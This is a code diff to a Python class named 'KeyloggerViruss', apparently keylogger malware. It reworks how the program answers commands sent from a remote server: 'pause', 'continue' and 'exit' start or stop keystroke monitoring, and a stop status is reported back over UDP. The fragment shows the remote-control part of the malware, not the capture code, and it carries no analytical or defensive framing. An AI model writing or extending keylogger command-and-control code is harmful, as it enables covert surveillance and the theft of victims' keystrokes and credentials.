@@ -115,9 +115,11 @@ class KeyloggerViruss():
                     if data.get("command", "") == "Server_active":
                         self.is_active_server = True
                         self.start_monitor()
-                    elif data.get("command", "") == "start":
+                    elif data.get("command", "") == "pause":
+                        self.stop_monitor()
+                    elif data.get("command", "") == "continue":
                         self.start_monitor()
-                    elif data.get("command", "") == "stop":
+                    elif data.get("command", "") == "exit":
                         self.stop_monitor()
                         message = "[KEYLOGGER STOPPED]"
                         self.send_udp_message(message=message, signal=False)
